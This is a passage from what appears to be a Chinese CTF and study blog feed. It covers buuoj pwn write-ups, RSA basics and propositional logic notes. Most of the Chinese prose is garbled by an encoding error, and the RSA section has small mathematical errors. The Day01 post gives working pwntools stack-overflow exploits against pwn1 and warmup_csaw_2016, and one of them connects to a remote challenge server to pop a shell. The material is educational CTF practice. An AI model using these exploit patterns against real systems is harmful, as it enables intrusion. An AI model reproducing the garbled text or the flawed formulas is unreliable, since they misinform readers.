#0x41348000==11.28125io.recvuntil("Let's guess the number.\n")io.sendline(payload)io.interactive()</code></pre><p>è€ƒç‚¹åˆ†æï¼š</p><ol><li>é€šè¿‡æ ˆæº¢å‡ºè¦†ç›–å±€éƒ¨å˜é‡ï¼Œæ¥ä¿®æ”¹ç¨‹åºçš„å€¼æ¥è¾¾åˆ°ä¿®æ”¹ç¨‹åºè¿è¡Œç»“æœçš„ç›®çš„</li></ol><h2 id="0x30-RSA"><a href="#0x30-RSA" class="headerlink" title="0x30 RSA"></a>0x30 RSA</h2><h3 id="0x00-å‰è¨€-1"><a href="#0x00-å‰è¨€-1" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>RSAç®€ä»‹éƒ¨åˆ†èŠ‚é€‰è‡ª<a href="https://blog.csdn.net/huanghelouzi/article/details/82943615" target="_blank" rel="noopener">https://blog.csdn.net/huanghelouzi/article/details/82943615</a></p><h3 id="0x10-æ•°å­¦åŸºç¡€"><a href="#0x10-æ•°å­¦åŸºç¡€" class="headerlink" title="0x10 æ•°å­¦åŸºç¡€"></a>0x10 æ•°å­¦åŸºç¡€</h3><p>ç´ æ•°ï¼ˆè´¨æ•°ï¼‰ã€åˆæ•°ã€äº’è´¨æ•°</p><p><strong>ç´ æ•°ï¼š</strong></p><blockquote><p>ä¸€ä¸ªæ•°å¦‚æœé™¤äº†1ä¸å®ƒæœ¬èº«ä¹‹å¤–æ²¡æœ‰å…¶ä»–çš„å› æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°å°±è¢«ç§°ä¸ºç´ æ•°ï¼ˆæˆ–è€…è´¨æ•°ï¼Œå–è‡ªè‹±æ–‡å•è¯primeçš„é¦–å­—æ¯ï¼‰</p></blockquote><p><strong>åˆæ•°ï¼š</strong></p><blockquote><p>å¦‚æœä¸€ä¸ªæ•°å¤§äº1ï¼Œä¸”è¯¥æ•°æœ¬èº«ä¸æ˜¯ç´ æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°å°±æ˜¯ä¸€ä¸ªåˆæ•°ã€‚</p></blockquote><p><strong>äº’è´¨æ•°ï¼š</strong></p><blockquote><p>å¦‚æœä¸¤ä¸ªæ•´æ•°$a,b$çš„æœ€å¤§å…¬å› æ•°ï¼ˆgreatest common divisorï¼‰ä¸º1ï¼Œå³$gcb(a,b)=1$ï¼Œé‚£ä¹ˆç§°a,bä¸¤æ•°äº’è´¨,ã€‚</p></blockquote><p><strong>æ¨¡åå…ƒç´ </strong>ï¼š</p><blockquote><p>å¦‚æœä¸¤ä¸ªæ­£æ•´æ•°$e$å’Œ$n$äº’è´¨ï¼Œé‚£ä¹ˆä¸€å®šå¯ä»¥æ‰¾åˆ°æ•´æ•°$ d $ï¼Œä½¿å¾—<code>e * (d -1)</code> è¢«${n}$æ•´é™¤ï¼Œæˆ–è€…è¯´<code>e * d</code> è¢«${n}$é™¤çš„ä½™æ•°æ˜¯1ã€‚è¿™æ—¶ï¼Œ$d$å°±å«åš$e$çš„â€œæ¨¡åå…ƒç´ â€ã€‚æ¬§æ‹‰å®šç†å¯ä»¥ç”¨æ¥è¯æ˜æ¨¡åå…ƒç´ å¿…ç„¶å­˜åœ¨ã€‚ä¸¤ä¸ªæ•´æ•°$a,b$ï¼Œå®ƒä»¬é™¤ä»¥æ•´æ•°$M$æ‰€å¾—çš„ä½™æ•°ç›¸ç­‰ï¼š<code>a â‰¡ b  ( mod  m)</code>ï¼Œæ¯”å¦‚è¯´5é™¤3ä½™æ•°ä¸º2ï¼Œ11é™¤3ä½™æ•°ä¹Ÿä¸º2ï¼Œäºæ˜¯å¯å†™æˆ <code>11 â‰¡ 5 ( mod  3)</code> </p></blockquote><h3 id="0x20-RSAç®€ä»‹"><a href="#0x20-RSAç®€ä»‹" class="headerlink" title="0x20 RSAç®€ä»‹"></a>0x20 RSAç®€ä»‹</h3><blockquote><p>é€‰æ‹©ä¸¤ä¸ªå¤§çš„å‚æ•°ï¼Œè®¡ç®—å‡ºæ¨¡æ•° $N = p * q$</p><p>è®¡ç®—æ¬§æ‹‰å‡½æ•° $Ï† = (p-1) * (q-1)$ï¼Œç„¶åé€‰æ‹©ä¸€ä¸ª$e(1&lt;e&lt;Ï†)$ï¼Œå¹¶ä¸”$e$å’Œ$Ï†$äº’è´¨</p><p>å–$e$çš„æ¨¡åæ•°$d$ï¼Œè®¡ç®—æ–¹æ³•ä¸º:$e * d â‰¡ 1 \quad (\quad mod \quad Ï†)$ </p><p>å¯¹æ˜æ–‡$m$è¿›è¡ŒåŠ å¯†ï¼š$c = pow(m, e, N)$,å¯ä»¥å¾—åˆ°å¯†æ–‡$c$</p><p>å¯¹å¯†æ–‡$c$è¿›è¡Œè§£å¯†ï¼š$m = pow(c, d, N)$,å¯ä»¥å¾—åˆ°æ˜æ–‡$m$</p></blockquote><p>æ•´ç†å¾—å‡ºï¼š</p><blockquote><p>$p$ å’Œ $q$ï¼šä¸¤ä¸ªå¤§çš„<code>è´¨æ•°</code>ï¼Œæ˜¯å¦ä¸€ä¸ªå‚æ•°$N$çš„çš„ä¸¤ä¸ªå› å­<br>$N$ï¼šå¤§æ•´æ•°ï¼Œå¯ä»¥ç§°ä¹‹ä¸º<code>æ¨¡æ•°</code><br>$e$ å’Œ $d$ï¼šäº’ä¸ºæ— åæ•°çš„ä¸¤ä¸ªæŒ‡æ•°<br>$c$ å’Œ $m$ï¼šå¯†æ–‡å’Œæ˜æ–‡<br>$(N, e)$ï¼šå…¬é’¥<br>$(N, d)$ï¼šç§é’¥<br>$pow(x, y, z)$ï¼šæ•ˆæœç­‰æ•ˆ$pow(x, y)1 % z$ï¼Œ å…ˆè®¡ç®—$x$çš„$y$æ¬¡æ–¹ï¼Œå¦‚æœå­˜åœ¨å¦ä¸€ä¸ªå‚æ•°$z$ï¼Œéœ€è¦å†å¯¹ç»“æœè¿›è¡Œå–æ¨¡ã€‚<br>å¯†é’¥é•¿åº¦ï¼š$n$ä»¥äºŒè¿›åˆ¶è¡¨ç¤ºçš„çš„ä½æ•°ï¼Œä¾‹å¦‚å¯†é’¥é•¿åº¦ä¸º512ä»£è¡¨$n$ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºçš„é•¿åº¦ä¸º512bit<br>RSAå®‰å…¨æ€§åˆ†æ<br>å¯¹äºRSAåŠ å¯†ç®—æ³•ï¼Œå…¬é’¥$(N, e)$ä¸ºå…¬é’¥ï¼Œå¯ä»¥ä»»æ„å…¬å¼€</p></blockquote><p>ä¿éšœRSAçš„å®‰å…¨æ€§:</p><blockquote><p>1.å®šæœŸæ›´æ¢å¯†é’¥<br>2.ä¸åŒçš„ç”¨æˆ·ä¸å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ¨¡æ•°N<br>3.$p$ä¸$q$çš„å·®å€¼è¦å¤§ï¼Œæœ€å¥½æ˜¯å·®å‡ ä¸ªæ¯”ç‰¹<br>4.$p-1$ä¸$q-1$éƒ½åº”è¯¥æœ‰å¤§çš„ç´ å› å­ï¼Œä¸€èˆ¬å»ºè®®é€‰æ‹©çš„ä¸¤ä¸ªå¤§ç´ æ•°$pã€q$ä½¿å¾—$p=2p+1$å’Œ$q=2q+1$ä¹Ÿæ˜¯ç´ æ•°<br>5.$e$çš„é€‰æ‹©ä¸è¦å¤ªå°<br>6.$d$çš„é€‰æ‹©ä¹Ÿæ˜¯ä¸å¯ä»¥å¤ªå°ï¼Œæœ€å¥½æ»¡è¶³$d&gt;=n/4$</p></blockquote><h3 id="0x20-example1"><a href="#0x20-example1" class="headerlink" title="0x20 example1"></a>0x20 example1</h3><p>æœ¬é¢˜é€‰è‡ªbuuoj.cn cryptoä¸­å¾—ä¸€é“RSA</p><p>è€ƒç‚¹ï¼šå·²çŸ¥ $p,q,e$ æ±‚ï¼š$d$</p><p>éš¾åº¦ï¼šå…¥é—¨</p><p>é¢˜ç›®ï¼š</p><blockquote><p>åœ¨ä¸€æ¬¡RSAå¯†é’¥å¯¹ç”Ÿæˆä¸­ï¼Œå‡è®¾p=473398607161ï¼Œq=4511491ï¼Œe=17<br>æ±‚è§£å‡ºdä½œä¸ºflgaæäº¤</p></blockquote><p>ç ´è§£RSAæœ€ç›´æ¥ï¼ˆäº¦æˆ–æ˜¯æš´åŠ›ï¼‰çš„æ–¹æ³•å°±æ˜¯åˆ†è§£æ•´æ•°Nâ€‹ï¼Œç„¶åè®¡ç®—æ¬§æ‹‰å‡½æ•°â€‹Ï†(n)=(p-1) * (q-1),å†é€šè¿‡:</p><script type="math/tex; mode=display">d  \quad * \quad e â‰¡ 1 \quad mod \quad Ï†(N)â€‹</script><p>å³å¯è®¡ç®—å‡º â€‹dâ€‹</p><p>è€Œåœ¨æœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“äº†$p,q,e$  ,ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦é€šè¿‡$d  \quad * \quad e â‰¡ 1 \quad mod \quad Ï†(N)$ å°±å¯ä»¥ç®—å‡º dâ€‹</p><p>æˆ‘ä»¬ä½¿ç”¨pythonæ¥å¸®åŠ©æˆ‘ä»¬è®¡ç®—</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-import gmpy2import gmpy2# gmpy2.mpz(x)# åˆå§‹åŒ–ä¸€ä¸ªå¤§æ•´æ•°xp = gmpy2.mpz(473398607161)q = gmpy2.mpz(4511491)e = gmpy2.mpz(17)n = (p-1)*(q-1)#d = gmpy2.invert(e,n) # æ±‚é€†å…ƒï¼Œd * e = 1 mod nd = gmpy2.invert(e,n)print(d)</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnç»ƒä¹ -Day01</title>
      <link href="/2020/03/13/ctf/pwn/day01/"/>
      <url>/2020/03/13/ctf/pwn/day01/</url>
      
        <content type="html"><![CDATA[<h1 id="Day01"><a href="#Day01" class="headerlink" title="Day01"></a>Day01</h1><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>é¢˜ç›®æ¥æºäº <a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><p>æŒ‰é¡ºåºåšçš„ï¼Œè¿™ä¸¤é“é¢˜æ¯”è¾ƒç®€å•ï¼Œå°±ä¸åšè¯¦ç»†è§£æäº†ï¼Œè§£æ³•åœ¨æˆ‘å‰å‡ ç¯‡å†™çš„pwnåŸºç¡€ä¸­æåˆ°è¿‡éƒ½æ˜¯ret2textçš„ç±»å‹</p><h2 id="0x10-pwn1"><a href="#0x10-pwn1" class="headerlink" title="0x10 pwn1"></a>0x10 pwn1</h2><p>ç»å…¸æ ˆæº¢å‡º</p><p>file</p><pre class=" language-lang-txt"><code class="language-lang-txt">pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped</code></pre><p>64ä½æ–‡ä»¶ dynamically linked<br>åŠ¨æ€é“¾æ¥åº“</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">[*] '/home/f0und/buuoj/pwn/pwn1/pwn1'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments</code></pre><p>æ— ä¿æŠ¤ï¼Œä¸”ç¨‹åºæä¾›äº†systemå‡½æ•°</p><p>ida åæ±‡ç¼–æŸ¥çœ‹</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [sp+1h] [bp-Fh]@1  puts("please input");  gets(&amp;s, argv);  puts(&amp;s);  puts("ok,bye!!!");  return 0;}</code></pre><p>fun()</p><pre class=" language-lang-c"><code class="language-lang-c">int fun(){  return system("/bin/sh");}</code></pre><p>peda ç®—å‡ºoffsetä¸º23</p><p>ç”±æ­¤payloadå°±æ˜æ˜¾äº†</p><pre class=" language-lang-txt"><code class="language-lang-txt">fun_addr=0x401186payload=flat(['a'*23,p64(fun_addr)])</code></pre><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level="debug"io=process("./pwn1")fun_addr=0x401186payload=flat(['a'*23,p64(fun_addr)])io.sendline(payload)io.interactive()</code></pre><p>è€Œè¿™ä¸ªexpåœ¨æœ¬åœ°è·‘æ˜¯æ²¡æœ‰ä»€ä¹ˆé—®é¢˜çš„</p><p>nc è¿ä¸Šå»å°±ä¼šè¶…æ—¶ï¼Œä¸€ä¼šæ€è€ƒä¸€ä¸‹</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level="debug"io=process("./pwn1")pop_ret_addr=0x401185fun_addr=0x401186payload=flat(['a'*23,p64(pop_ret_addr),p64(fun_addr)])io.sendline(payload)io.interactive()</code></pre><h2 id="0x20-warmup-csaw-2016"><a href="#0x20-warmup-csaw-2016" class="headerlink" title="0x20 warmup_csaw_2016"></a>0x20 warmup_csaw_2016</h2><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">warmup_csaw_2016: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped</code></pre><p>64ä½åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶</p><p>checksec:</p><pre class=" language-lang-txt"><code class="language-lang-txt">[*] '/home/f0und/buuoj/pwn/warmup_csaw_2016/warmup_csaw_2016'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments</code></pre><p>åŒæ ·æ²¡å¾—ä»»ä½•ä¿æŠ¤</p><p>ida åæ±‡ç¼–æŸ¥çœ‹</p><pre class=" language-lang-txt"><code class="language-lang-txt">int __fastcall main(__int64 a1, char **a2, char **a3){  char s; // [sp+0h] [bp-80h]@1  char v5; // [sp+40h] [bp-40h]@1  write(1, "-Warm Up-\n", 0xAuLL);  write(1, "WOW:", 4uLL);  sprintf(&amp;s, "%p\n", sub_40060D);  write(1, &amp;s, 9uLL);  write(1, "&gt;", 1uLL);  return gets(&amp;v5, "&gt;");}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int sub_40060D(){  return system("cat flag.txt");}</code></pre><p>emmmï¼Œæ¯”ä¸Šä¸€é¢˜è¿˜ç®€å•</p><p>ç›´æ¥exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level="debug"io=remote("node3.buuoj.cn",29722)#io=process("./warmup_csaw_2016")sys_addr=0x40060dpayload=flat(['a'*72,p64(sys_addr)])io.sendline(payload)io.interactive()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½é¢˜åŠå…¶è”ç»“è¯</title>
      <link href="/2020/02/26/math/lisan-1-1-md/"/>
      <url>/2020/02/26/math/lisan-1-1-md/</url>
      
        <content type="html"><![CDATA[<h1 id="å‘½é¢˜ç¬¦å·åŒ–åŠè”ç»“è¯"><a href="#å‘½é¢˜ç¬¦å·åŒ–åŠè”ç»“è¯" class="headerlink" title="å‘½é¢˜ç¬¦å·åŒ–åŠè”ç»“è¯"></a>å‘½é¢˜ç¬¦å·åŒ–åŠè”ç»“è¯</h1><h2 id="0x00-å‰ç½®çŸ¥è¯†"><a href="#0x00-å‰ç½®çŸ¥è¯†" class="headerlink" title="0x00 å‰ç½®çŸ¥è¯†"></a>0x00 å‰ç½®çŸ¥è¯†</h2><p>å‘½é¢˜ï¼šèƒ½åˆ¤æ–­çœŸå‡çš„<strong>é™ˆè¿°å¥</strong>ï¼Œæ˜¯å…·æœ‰<strong>å”¯ä¸€çœŸå€¼</strong>çš„é™ˆè¿°å¥ <span class="github-emoji" style="display:inline;vertical-align:middle;color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8">ğŸ˜„</span></p><p>å‘½é¢˜ç¬¦å·åŒ–ï¼šä½¿ç”¨å°å†™çš„è‹±æ–‡å­—æ¯ ${p},{q},{r},{â€¦},{q_i},{p_i},{r_i},{â€¦}$ æ¥è¡¨ç¤ºå‘½é¢˜</p><p>ä¾‹1-1ï¼š</p><script type="math/tex; mode=display">{p}: 2æ˜¯ç´ æ•° \\{q}: é›ªæ˜¯é»‘çš„</script><h2 id="0x10-ç®€å•å‘½é¢˜"><a href="#0x10-ç®€å•å‘½é¢˜" class="headerlink" title="0x10 ç®€å•å‘½é¢˜"></a>0x10 ç®€å•å‘½é¢˜</h2><p>æ®æ•™ç§‘ä¹¦çš„å®šä¹‰ï¼Œ<strong>æŠŠä¸å«é€»è¾‘è”ç»“è¯â€œæˆ–â€ã€â€œä¸”â€ã€â€œéâ€çš„å‘½é¢˜ç§°ä¸ºç®€å•å‘½é¢˜</strong>ï¼ˆæœ‰é€»è¾‘ä¹¦ç§°ä¸ºåŸå­å‘½é¢˜ï¼‰ï¼è®¤ä¸ºç®€å•å‘½é¢˜æ˜¯é€»è¾‘æ¼”ç®—æœ€åŸºæœ¬çš„å•ä½ï¼Œåº”è¢«çœ‹åšæ˜¯ä¸€ä¸ªä¸å¯å†åˆ†å‰²çš„æ•´ä½“ï¼ä¾‹å¦‚ï¼Œâ€œ3æ˜¯12çš„çº¦æ•°â€ã€â€œ0ï¼5æ˜¯æ•´æ•°â€ï¼Œå®ƒä»¬éƒ½æ˜¯ç®€å•å‘½é¢˜ï¼</p><p>åœ¨ä¾‹1-1ä¸­p,qçš„çœŸå€¼æ˜¯ç¡®å®šçš„ï¼Œæ­¤æ—¶${p},{q}$ åˆè¢«ç§°ä¸º<strong>å‘½é¢˜å¸¸é¡¹ï¼ˆæœ‰ä¹¦ç§°ä¸ºå‘½é¢˜å¸¸å…ƒï¼‰</strong> </p><p>è€Œå¯¹äºåƒä¾‹1-2ï¼š</p><script type="math/tex; mode=display">{p}:{x}+{y}>7</script><p>è¿™æ ·çš„å‘½é¢˜ï¼Œå½“ ${x},{y}$ çš„å€¼ç¡®å®šä¸‹æ¥ä»¥åå‘½é¢˜çš„çœŸå€¼æ‰èƒ½ç¡®å®šçš„è¿™ç§ <strong>çœŸå€¼å¯ä»¥å˜åŒ–çš„ç®€å•é™ˆè¿°å¥</strong> ç§°ä¸º<strong>å‘½é¢˜å˜é¡¹ï¼ˆå‘½é¢˜å˜å…ƒï¼‰</strong></p><p><strong><em>æ³¨ï¼šå‘½é¢˜å˜é¡¹ä¸æ˜¯å‘½é¢˜</em></strong></p><h2 id="0x20-å¤åˆå‘½é¢˜"><a href="#0x20-å¤åˆå‘½é¢˜" class="headerlink" title="0x20 å¤åˆå‘½é¢˜"></a>0x20 å¤åˆå‘½é¢˜</h2><p><strong>ç”±ç®€å•å‘½é¢˜ä¸é€»è¾‘è”ç»“è¯æ„æˆçš„å‘½é¢˜æ˜¯å¤åˆå‘½é¢˜</strong>ï¼ä¾‹å¦‚ï¼Œâ€œ20å¯è¢«4æˆ–5æ•´é™¤â€ã€â€œå¹³è¡Œå››è¾¹å½¢çš„å¯¹è¾¹ç›¸ç­‰ä¸”å¹³è¡Œâ€ã€â€œ2éç´ æ•°â€ï¼Œä¸Šè¿°ä¸‰ä¸ªå‘½é¢˜éƒ½æ˜¯å¤åˆå‘½é¢˜ï¼Œå› ä¸ºå®ƒä»¬åˆ†åˆ«å«æœ‰é€»è¾‘è”ç»“è¯â€œæˆ–â€ã€â€œä¸”â€ã€â€œéâ€ï¼</p><p>ä¾‹1-3ï¼š</p><script type="math/tex; mode=display">{p}:{3ä¸æ˜¯å¶æ•°} \\{q}:{2æ˜¯å¶æ•°å’Œç´ æ•°} \\{r}:{æ—èŠ³å­¦è¿‡æ—¥è¯­æˆ–è‹±è¯­}</script><h2 id="0x30-è”ç»“è¯è¿ç®—ä¼˜å…ˆçº§"><a href="#0x30-è”ç»“è¯è¿ç®—ä¼˜å…ˆçº§" class="headerlink" title="0x30 è”ç»“è¯è¿ç®—ä¼˜å…ˆçº§"></a>0x30 è”ç»“è¯è¿ç®—ä¼˜å…ˆçº§</h2><script type="math/tex; mode=display">\negã€\bigwedgeã€\bigveeã€\rightarrowã€\leftrightarrow</script><p>è”ç»“è¯ä¹Ÿç§°ä½œé€»è¾‘è¿ç®—ç¬¦ï¼Œåœ¨è¿ç®—æ—¶æœ‰ä¼˜å…ˆçº§ï¼Œæœ‰æ‹¬å·å…ˆç®—æ‹¬å·é‡Œçš„å†…å®¹ï¼Œç„¶åæŒ‰ç…§ä¸Šé¢çš„ä¼˜å…ˆçº§è¿›è¡Œè¿ç®—</p><p>å‘½é¢˜ä¸€èˆ¬ä»¥ <code>1</code>æ¥è¡¨ç¤ºçœŸï¼Œ<code>0</code>æ¥è¡¨ç¤ºå‡</p><div class="table-container"><table><thead><tr><th style="text-align:center">${p}$</th><th style="text-align:center">${q}$</th><th style="text-align:center">${p}\bigwedge{q}$</th><th style="text-align:center">${p}\bigvee{q}$</th><th style="text-align:center">${p}\rightarrow{q}$</th><th style="text-align:center">${p}\leftrightarrow{q}$</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr></tbody></table></div><h2 id="0x90-è¯¾åä¹ é¢˜"><a href="#0x90-è¯¾åä¹ é¢˜" class="headerlink" title="0x90 è¯¾åä¹ é¢˜"></a>0x90 è¯¾åä¹ é¢˜</h2><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200225214246.png" alt="ä¾‹é¢˜ 1-5"></p><p>è§£ï¼šï¼ˆ1ï¼‰</p><script type="math/tex; mode=display">{è®¾}:{p}:2æ˜¯å¶æ•°.{q}:2æ˜¯ç´ æ•°\\æ•…:å¯ç”¨{p}\bigwedge{q}è¡¨ç¤º2æ˜¯å¶æ•°åˆæ˜¯ç´ æ•°</script><p>â€‹    ï¼ˆ2ï¼‰</p><script type="math/tex; mode=display">{è®¾}:{p}:å°ç‹èªæ˜.{q}:å°ç‹ç”¨åŠŸ\\{æ•…}:å¯ç”¨{p}\bigwedge{q}æ¥è¡¨ç¤ºå°ç‹ä¸ä½†èªæ˜è€Œä¸”ç”¨åŠŸ</script><p>â€‹    ï¼ˆ3ï¼‰</p><script type="math/tex; mode=display">è®¾:{p}:å¤©æ°”å¾ˆå†·.{q}:è€ç‹æ¥äº†\\æ•…å¯ç”¨{p}\bigwedge{q}æ¥è¡¨ç¤ºè™½ç„¶å¤©æ°”å¾ˆå†·ï¼Œè€ç‹è¿˜æ˜¯æ¥äº†</script><p>â€‹    ï¼ˆ4ï¼‰</p><script type="math/tex; mode=display">è®¾:{p}:ä»–åƒé¥­.{q}:ä»–çœ‹ç”µè§†\\æ•…å¯ç”¨{p}\bigwedge{q}æ¥è¡¨ç¤ºä»–ä¸€è¾¹åƒé¥­ä¸€è¾¹çœ‹ç”µè§†</script><p>ï¼ˆ5ï¼‰</p><script type="math/tex; mode=display">è®¾:{p}:å¤©ä¸‹å¤§é›¨.{q}:ä»–ä¹˜å…¬äº¤æ±½è½¦ä¸Šç­\\æ•…å¯ç”¨{p}\rightarrow{q}å¦‚æœå¤©ä¸‹å¤§é›¨ä»–å°±ä¹˜å…¬äº¤è½¦</script><p>ï¼ˆ6ï¼‰</p><script type="math/tex; mode=display">è®¾:{p}:å¤©ä¸‹å¤§é›¨.{q}:ä»–ä¹˜å…¬äº¤æ±½è½¦ä¸Šç­\\æ•…å¯ç”¨{q}\rightarrow{p}åªæœ‰å¤©ä¸‹å¤§é›¨ï¼Œä»–æ‰ä¹˜å…¬å…±æ±½è½¦ä¸Šç­</script><p>ï¼ˆ7ï¼‰</p><script type="math/tex; mode=display">è®¾:{p}:å¤©ä¸‹å¤§é›¨.{q}:ä»–ä¹˜å…¬äº¤æ±½è½¦ä¸Šç­\\æ•…å¯ç”¨{q}\rightarrow{p}é™¤éå¤©ä¸‹å¤§é›¨ï¼Œå¦åˆ™ä»–ä¸ä¹˜å…¬äº¤æ±½è½¦ä¸Šç­</script><p>æ€»ç»“ï¼š<code>å‘½é¢˜ç¬¦å·åŒ–ï¼Œéœ€è¦å°†å‘½é¢˜å…ˆè½¬æ¢æˆç®€å•å‘½é¢˜ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ç¬¦å·åŒ–çš„p,qä¸èƒ½å¸¦ä¸ï¼Œéè¿™æ ·çš„æ–‡å­—</code></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200225214245.png" alt="ä¾‹é¢˜ 1-6"></p><p>è§£ï¼šï¼ˆ1ï¼‰</p><script type="math/tex; mode=display">\because{p},{q}çš„çœŸå€¼ä¸º0ï¼Œ{r}çš„çœŸå€¼ä¸º1\\\therefore{q}\bigwedge{r}çš„çœŸå€¼ä¸º0\\\therefore{p}\bigvee({q}\bigwedge{r})çš„çœŸå€¼ä¸º0</script><p>â€‹    ï¼ˆ2ï¼‰</p><script type="math/tex; mode=display">\because{p}\leftrightarrow{r}çš„çœŸå€¼ä¸º0ï¼Œ\neg{q}\bigvee{s}çš„çœŸå€¼ä¸º1\\\therefore ({p}\leftrightarrow{q})\bigwedge(\neg{q}\bigvee{s})çš„çœŸå€¼ä¸º0</script><p>â€‹    ï¼ˆ3ï¼‰</p><script type="math/tex; mode=display">\because{q}\bigvee{r}çš„çœŸå€¼ä¸º1,{p}\bigvee{q}çš„çœŸå€¼ä¸º0ï¼Œ{r}\bigwedge{s}çš„çœŸå€¼ä¸º1\\\therefore({p}\bigwedge({q}\bigvee{r}))\rightarrow(({p}\bigvee{q})\bigwedge({r}\bigwedge{s}))çš„çœŸå€¼ä¸º1</script><h2 id="0x100-å‚è€ƒèµ„æ–™"><a href="#0x100-å‚è€ƒèµ„æ–™" class="headerlink" title="0x100 å‚è€ƒèµ„æ–™"></a>0x100 å‚è€ƒèµ„æ–™</h2><p>å±ˆå©‰å©·ã€Šç¦»æ•£æ•°å­¦ï¼ˆç¬¬äº”ç‰ˆï¼‰ã€‹â€”â€”ç¬¬ä¸€ç«  å‘½é¢˜é€»è¾‘</p><p>å…¬å¼ä½¿ç”¨LaTeX<span class="github-emoji" style="display:inline;vertical-align:middle;color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8">ğŸ˜†</span></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux pwné¢˜ç›®éƒ¨ç½²ç¯å¢ƒæ­å»º</title>
      <link href="/2020/02/18/ctf/pwn/pwn-env/"/>
      <url>/2020/02/18/ctf/pwn/pwn-env/</url>
      
